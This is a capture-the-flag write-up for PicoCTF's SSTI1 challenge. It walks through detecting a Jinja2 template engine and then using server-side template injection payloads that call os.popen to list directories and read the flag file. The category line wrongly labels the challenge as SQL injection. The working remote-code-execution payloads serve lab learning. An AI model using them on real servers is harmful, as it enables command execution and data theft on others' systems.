# SSTI1 - PicoCTF
## Challenge Description

* **Category**: SQL Injection, Web Exploitation
* **Description**: I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website here!
* **Link Resource**: `https://play.picoctf.org/practice/challenge/492?page=1&search=ssti1`

## Solution

### Step 1 : Detect the Engine

* To detect the engine, we can try to input anything to the given input cell, here I am using the inout of `{{8 * 9}}`
* The output is `72`, which is the direct calculation of the given input. This also indicating that the engine is Jinja2, templating engine for Python programming.

[engine](../../assets/SSTI1-1.png)

### Step 2 : List the directories

* We will try to list all the available directories using the given payload

```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls -R').read()}}
```

* We can see a "flag" in the output shown

[hintssti1](../../assets/SSTI1-2.png)

### Step 3 : Modify the previous payload

* Use the below payload to show the flag

```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

## Result

We are able to acquire the flag.

[ssti1flag](../../assets/SSTI1-3.png)

## Explanation

The vulnerability exploited here is **Server-Side Template Injection (SSTI)** in a web application using the Jinja2 templating engine. By leveraging Jinja2’s access to Python built-ins, we escalated the injection to execute system commands (`os.popen`), which allowed us to list directories and eventually read the `flag` file from the server. This demonstrates how SSTI can lead to full remote code execution and sensitive data disclosure when input is not properly validated or sandboxed.
